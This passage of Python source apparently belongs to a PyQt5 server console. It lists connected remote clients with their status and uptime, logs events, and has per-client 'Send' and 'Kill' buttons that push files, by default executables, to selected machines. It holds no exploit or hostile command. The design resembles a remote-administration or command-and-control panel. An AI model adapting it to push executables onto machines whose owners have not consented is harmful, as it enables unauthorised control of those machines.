        self.client_table.horizontalHeader().setSectionResizeMode(5, QHeaderView.ResizeToContents) # Actions column
        self.client_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.client_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.client_table.setShowGrid(True)
        self.client_table.setAlternatingRowColors(True) # Subtle alternating row colors
        self.client_table.setStyleSheet(self.client_table.styleSheet() + \
                                        "QTableWidget { alternate-background-color: #2A2A2A; }")
        client_layout.addWidget(self.client_table)
        splitter.addWidget(client_section_widget)

        # Log Table Section
        log_section_widget = QWidget()
        log_layout = QVBoxLayout(log_section_widget)
        log_layout.setContentsMargins(5, 5, 5, 5)
        self.log_table = QTableWidget()
        self.log_table.setColumnCount(4)
        self.log_table.setHorizontalHeaderLabels([
            "Timestamp", "Type", "Source/Client", "Message"
        ])
        self.log_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.log_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents) # Timestamp
        self.log_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents) # Type
        self.log_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.log_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.log_table.setShowGrid(True)
        self.log_table.setAlternatingRowColors(True)
        self.log_table.setStyleSheet(self.log_table.styleSheet() +\
                                     "QTableWidget { alternate-background-color: #2A2A2A; }")
        log_layout.addWidget(self.log_table)
        splitter.addWidget(log_section_widget)

        main_layout.addWidget(splitter)
        splitter.setSizes([int(self.height() * 0.6), int(self.height() * 0.4)]) # Initial sizing

        # --- Toolbar ---
        toolbar = QToolBar("Main Toolbar")
        toolbar.setIconSize(QSize(16, 16))
        self.addToolBar(Qt.TopToolBarArea, toolbar)

        send_action = QAction(QIcon.fromTheme("document-send", self.style().standardIcon(QStyle.SP_FileDialogToParent)), "Send File", self)
        send_action.triggered.connect(self.send_file_to_selected)
        toolbar.addAction(send_action)

        clear_action = QAction(QIcon.fromTheme("edit-clear", self.style().standardIcon(QStyle.SP_TrashIcon)), "Clear Logs", self)
        clear_action.triggered.connect(self.clear_logs)
        toolbar.addAction(clear_action)
        
        toolbar.addSeparator()
        
        # Example for future plugin buttons
        # plugin_action = QAction(QIcon.fromTheme("utilities-terminal"), "Manage Plugins", self)
        # toolbar.addAction(plugin_action)

        # --- Status Bar ---
        self.statusBar = QStatusBar()
        self.setStatusBar(self.statusBar)
        self.client_count_label = QLabel("Clients: 0")
        self.statusBar.addPermanentWidget(self.client_count_label)
        self.server_status_label = QLabel(f"Listening on {HOST}:{PORT}")
        self.statusBar.addWidget(self.server_status_label)

    def send_file_to_selected(self):
        """Send file to selected clients"""
        selected_rows = self.client_table.selectedItems()
        if not selected_rows:
            QMessageBox.warning(self, "Warning", "Please select at least one client")
            return
            
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select File to Send",
            "",
            "Executable Files (*.exe);;All Files (*.*)"
        )
        
        if file_path:
            for item in selected_rows:
                row = item.row()
                addr = (self.client_table.item(row, 0).text(),
                       int(self.client_table.item(row, 1).text()))
                self.server_thread.send_file_to_client(file_path, addr)

    def clear_logs(self):
        """Clear the log table"""
        self.log_table.setRowCount(0)

    def update_gui(self):
        """Process any pending GUI updates"""
        self.process_pending_updates()

    def process_pending_updates(self):
        """Process pending GUI updates in batches"""
        if not self.pending_updates:
            return
            
        try:
            batch_size = 10
            processed_count = 0
            
            while self.pending_updates and processed_count < batch_size:
                update_type, data = self.pending_updates.pop(0)
                processed_count += 1
                
                if update_type == "add_client":
                    self._add_client_impl(data)
                elif update_type == "remove_client":
                    self._remove_client_impl(data)
                elif update_type == "update_status":
                    addr_tuple, status_str = data
                    self._update_client_status_impl(addr_tuple, status_str)
                elif update_type == "log":
                    self._append_log_impl(data)
            
            if processed_count > 0:
                QApplication.processEvents()
            
        except Exception as e:
            logger.error(f"Critical Error processing GUI updates batch: {e}", exc_info=True)

    def _add_client_impl(self, addr: tuple):
        """Implementation of adding a client to the table, preventing duplicates."""
        with self.gui_lock:
            try:
                # Check if client with this address already exists (e.g. rapid reconnect)
                if addr in self.clients:
                    # Option 1: Log and ignore if already connecting/connected (prevent visual duplicate)
                    # logger.warning(f"Client {addr} attempting to re-add while already present. Ignoring add.")
                    # return

                    # Option 2: If it exists, try to re-use/update its row if it was marked for removal or failed.
                    # This is more complex as it requires tracking client state more finely.
                    # For now, let's ensure the old one is robustly removed first.
                    # If a client is re-added, it means the previous one should have been removed.
                    # The issue might be the remove signal not being processed before the new add signal.
                    # The current logic below will add a new row, relying on the remove for the old one.
                    # We will focus on making remove more robust.
                    logger.info(f"Client {addr} is being re-added. Previous instance should have been removed.")

                row = self.client_table.rowCount()
                self.client_table.insertRow(row)

                ip_item = QTableWidgetItem(addr[0])
                port_item = QTableWidgetItem(str(addr[1]))
                # Initial status is now set by the ClientHandler's first update_client_status_signal
                status_item = QTableWidgetItem("Pending Add...") # Placeholder until first real status update
                status_item.setForeground(QColor("#E0E0E0"))
                time_item = QTableWidgetItem(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                uptime_item = QTableWidgetItem("00:00:00")

                for item in [ip_item, port_item, status_item, time_item, uptime_item]:
                    item.setTextAlignment(Qt.AlignCenter)

                self.client_table.setItem(row, 0, ip_item)
                self.client_table.setItem(row, 1, port_item)
                self.client_table.setItem(row, 2, status_item) # Status will be updated by update_client_status
                self.client_table.setItem(row, 3, time_item)
                self.client_table.setItem(row, 4, uptime_item)

                actions_widget = QWidget()
                actions_layout = QHBoxLayout(actions_widget)
                actions_layout.setContentsMargins(2, 2, 2, 2)
                actions_layout.setSpacing(3)
                button_style = """QPushButton {{...}} """ # Keep existing button style
                send_btn = QPushButton("Send")
                send_btn.setStyleSheet(button_style)
                send_btn.setToolTip("Send file to this client")
                send_btn.clicked.connect(lambda: self.send_file_to_client(addr))
                disconnect_btn = QPushButton("Kill")
                disconnect_btn.setStyleSheet(button_style)
                disconnect_btn.setToolTip("Disconnect this client")
                disconnect_btn.clicked.connect(lambda: self.disconnect_client(addr))
                actions_layout.addWidget(send_btn)
                actions_layout.addWidget(disconnect_btn)
                actions_layout.addStretch()
                self.client_table.setCellWidget(row, 5, actions_widget)

                # Critical: Register client in self.clients here
                if addr not in self.clients:
                    self.client_count += 1
                self.clients[addr] = {
                    "row": row, 
                    "connect_time": datetime.now(), 
                    "last_seen": datetime.now(), 
                    "uptime_timer": QTimer(),
                    "status": "Pending Add..." # Initial internal status
                }
                self.client_count_label.setText(f"Clients: {self.client_count}")
                self._start_uptime_timer(addr, row)
                logger.info(f"Client {addr} added to GUI at row {row}.")

            except Exception as e:
                logger.error(f"Error in _add_client_impl for {addr}: {e}")

    def _remove_client_impl(self, addr: tuple):
        """Implementation of removing a client from the table and stopping its timer."""
        with self.gui_lock:
            try:
                if addr in self.clients:
                    client_data = self.clients.pop(addr) # Remove from dict and get data
                    row_to_remove = client_data["row"]
                    client_data["uptime_timer"].stop()
                    
                    self.client_table.removeRow(row_to_remove)
                    logger.info(f"Client {addr} removed from GUI at row {row_to_remove}.")

                    self.client_count -= 1
                    self.client_count_label.setText(f"Clients: {self.client_count}")
                    
                    # Adjust row indices for clients that were below the removed one
                    for remaining_addr, remaining_data in self.clients.items():
                        if remaining_data["row"] > row_to_remove:
                            remaining_data["row"] -= 1
                else:
                    logger.warning(f"_remove_client_impl: Attempted to remove non-existent or already removed client: {addr}")
            except Exception as e:
                logger.error(f"Error in _remove_client_impl for {addr}: {e}")

    def _update_client_status_impl(self, addr: tuple, status: str):
        """Implementation of updating client status in the table"""
        with self.gui_lock:
            try:
                if addr not in self.clients:
                    # This can happen if remove_client signal processed faster than a lingering status update
                    logger.warning(f"_update_client_status_impl: Attempted to update status for unknown/removed client: {addr} to {status}")
                    return

                client_data = self.clients[addr]
                row = client_data["row"]
                client_data["status"] = status # Update internal status tracker

                if row < self.client_table.rowCount():
                    status_item = self.client_table.item(row, 2)
                    if not status_item:
                        status_item = QTableWidgetItem()
                        self.client_table.setItem(row, 2, status_item)
                    status_item.setText(status)
                    status_item.setTextAlignment(Qt.AlignCenter)

                    # Color coding (same as before)
                    if status == "Authenticated" or status == "Connected":
                        status_item.setForeground(QColor("#4CAF50"))
                    elif status == "Key Exchange Failed" or status == "Disconnected" or status == "Key Exchange Timeout" or status == "Key Exchange Error":
                        status_item.setForeground(QColor("#F44336"))
                    elif status == "Connecting..." or status == "Key Exchange...":
                        status_item.setForeground(QColor("#FFC107"))
                    elif status == "Sending File":
                        status_item.setForeground(QColor("#2196F3"))
                    else:
                        status_item.setForeground(QColor("#E0E0E0"))
                    
                    client_data["last_seen"] = datetime.now()
                else:
                    logger.warning(f"_update_client_status_impl: Row {row} out of bounds for client {addr} (status: {status}). Client table count: {self.client_table.rowCount()}")

            except Exception as e:
                logger.error(f"Error in _update_client_status_impl for {addr}, status {status}: {e}")

    def _start_uptime_timer(self, addr: tuple, row: int):
        """Starts a QTimer to update the uptime for a specific client."""
        if addr not in self.clients:
            return
        
        timer = self.clients[addr]["uptime_timer"]
        timer.timeout.connect(lambda: self._update_uptime(addr, row))
        timer.start(1000) # Update every second

    def _update_uptime(self, addr: tuple, row: int):
        """Updates the uptime display in the client table."""
        with self.gui_lock: # Protect access to self.clients and table
            if addr not in self.clients: # Client might have been removed
                # The timer for this addr should have been stopped by _remove_client_impl
                # but as a safeguard, we check here too.
                # logger.debug(f"_update_uptime: Client {addr} no longer in self.clients. Timer should be stopped.")
                return

            # Ensure row index is still valid for the *current* state of self.clients[addr]
            # This is important if rows might have shifted due to other removals.
            # The `row` argument to this function might become stale if not careful.
            # It's safer to get the current row from self.clients[addr]["row"]
            current_row_for_addr = self.clients[addr]["row"]

            if current_row_for_addr >= self.client_table.rowCount():
                logger.warning(f"_update_uptime: Row {current_row_for_addr} for client {addr} is out of bounds. Stopping timer.")
                self.clients[addr]["uptime_timer"].stop()
                # It's possible the client is about to be removed, or was removed without stopping timer correctly.
                return

            connect_time = self.clients[addr]["connect_time"]
            uptime_delta = datetime.now() - connect_time
            uptime_str = str(uptime_delta).split('.')[0] # HH:MM:SS format
            
            uptime_item = self.client_table.item(current_row_for_addr, 4)
            if not uptime_item:
                uptime_item = QTableWidgetItem()
                self.client_table.setItem(current_row_for_addr, 4, uptime_item)
            uptime_item.setText(uptime_str)
            uptime_item.setTextAlignment(Qt.AlignCenter)

    def _append_log_impl(self, data: tuple):
        """Actual implementation of appending log message"""
        try:
            message, log_type, client = data
            if not hasattr(self, 'log_table') or not self.log_table or not self.log_table.isVisible():
                logger.info(f"[{log_type}] {client or 'System'}: {message}")
                return
                
            timestamp = datetime.now()
            row = self.log_table.rowCount()
            
            # Limit log table size
            if row >= 1000:  # Keep last 1000 entries
                self.log_table.removeRow(0)
                row = 999
            
            # Create all items at once
            items = [
                QTableWidgetItem(timestamp.strftime("%Y-%m-%d %H:%M:%S")),
                QTableWidgetItem(log_type),
                QTableWidgetItem(client or "System"),
                QTableWidgetItem(message)
            ]
            
            # Set color based on log type
            if log_type == LogType.ERROR:
                items[1].setForeground(QColor("#f44336"))
            elif log_type == LogType.FILE_TRANSFER:
                items[1].setForeground(QColor("#2196F3"))
            elif log_type == LogType.CONNECTION:
                items[1].setForeground(QColor("#4CAF50"))
            
            # Insert row and set items in one go
            self.log_table.insertRow(row)
            for col, item in enumerate(items):
                self.log_table.setItem(row, col, item)
                
        except Exception as e:
            logger.error(f"Error appending log: {e}")
            logger.info(f"[{log_type}] {client or 'System'}: {message}")

    def append_log(self, message: str, log_type: str = LogType.SYSTEM, client: str = None):
        """Queue log message for batch processing"""
        self.pending_updates.append(("log", (message, log_type, client)))

    def closeEvent(self, event):
        """Handle window close event"""
        reply = QMessageBox.question(
            self,
            'Confirm Exit',
            'Are you sure you want to exit?',
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            logger.info("Initiating application shutdown sequence...")
            
            # Stop GUI timers first
            if hasattr(self, 'update_timer') and self.update_timer.isActive():
                self.update_timer.stop()
                logger.info("GUI update timer stopped.")
            
            # Stop all client-specific uptime timers managed in self.clients
            # Make a copy of keys if self.clients might be modified during iteration indirectly
            for addr in list(self.clients.keys()):
                if addr in self.clients and self.clients[addr].get("uptime_timer").isActive():
                    self.clients[addr]["uptime_timer"].stop()
                    logger.debug(f"Uptime timer for client {addr} stopped.")

            # Stop the main server thread and its managed threads (blocking call)
            logger.info("Signaling ServerThread to stop...")
            self.server_thread.stop() 
            logger.info("ServerThread.stop() has returned.")
            
            # Signal Qt's main event loop to terminate
            # This allows app.exec_() to return
            logger.info("Quitting QApplication event loop...")
            QApplication.quit()
            
            logger.info("Accepting close event.")
            event.accept()
        else:
            logger.info("Application shutdown cancelled by user.")
            event.ignore()

    def add_client(self, addr: tuple):
        """Queue client addition for batch processing"""
        self.pending_updates.append(("add_client", addr))

    def remove_client(self, addr: tuple):
        """Queue client removal for batch processing"""
        self.pending_updates.append(("remove_client", addr))

    def update_client_status(self, addr: tuple, status: str):
        """Queue client status update for batch processing"""
        self.pending_updates.append(("update_status", (addr, status)))

    def setup_tray_icon(self):
        """Set up the system tray icon"""
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        # Create tray menu
        tray_menu = QMenu()
        
        # Add show/hide action
        show_action = QAction("Show/Hide", self)
        show_action.triggered.connect(self.toggle_window)
        tray_menu.addAction(show_action)
        
        # Add separator
        tray_menu.addSeparator()
        
        # Add exit action
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(self.close)
        tray_menu.addAction(exit_action)
        
        # Set the tray icon's context menu
        self.tray_icon.setContextMenu(tray_menu)
        
        # Connect tray icon activation to show/hide window
        self.tray_icon.activated.connect(self.tray_icon_activated)
        
        # Show the tray icon
        self.tray_icon.show()

    def toggle_window(self):
        """Toggle window visibility"""
        if self.isVisible():
            self.hide()
        else:
            self.show()
            self.activateWindow()

    def tray_icon_activated(self, reason):
        """Handle tray icon activation"""
        if reason == QSystemTrayIcon.DoubleClick:
            self.toggle_window()

    def disconnect_client(self, addr: tuple):
        """Disconnect a client"""
        try:
            client = self.server_thread.client_manager.get_client(addr)
            if client:
                client.running = False
                client.conn.close()
        except Exception as e:
            logger.error(f"Error disconnecting client {addr}: {e}")

def validate_environment() -> bool:
    if not os.path.exists('.env'):
        logger.error("Environment file not found")
        return False
    # Only check for root user on Unix-like systems
    if sys.platform != 'win32' and os.geteuid() == 0:
        logger.error("Running as root is not allowed")
        return False
    return True

if __name__ == "__main__":
    if validate_environment():
        app = QApplication(sys.argv)
        app.setStyle("Fusion")
        window = ServerGUI()
        window.show()
        sys.exit(app.exec_())
    else:
        sys.exit(1)